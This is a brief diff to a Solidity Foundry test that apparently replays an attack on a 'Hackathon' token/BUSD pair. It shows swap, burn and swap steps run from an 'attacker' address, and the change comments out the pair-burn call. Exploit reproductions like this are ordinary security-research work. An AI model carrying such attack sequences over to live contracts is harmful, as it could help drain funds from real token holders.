@@ -196,7 +196,7 @@ contract HackathonTestBase is Test, BlockLoader {
             pair.getAmountOut(busd.balanceOf(attacker), address(busd))
         );
         printBalance("After step1 ");
-        burn_hackathon_pair(hackathon.balanceOf(attacker));
+        // burn_hackathon_pair(hackathon.balanceOf(attacker));
         printBalance("After step2 ");
         swap_pair_attacker_hackathon_busd(
             hackathon.balanceOf(attacker),
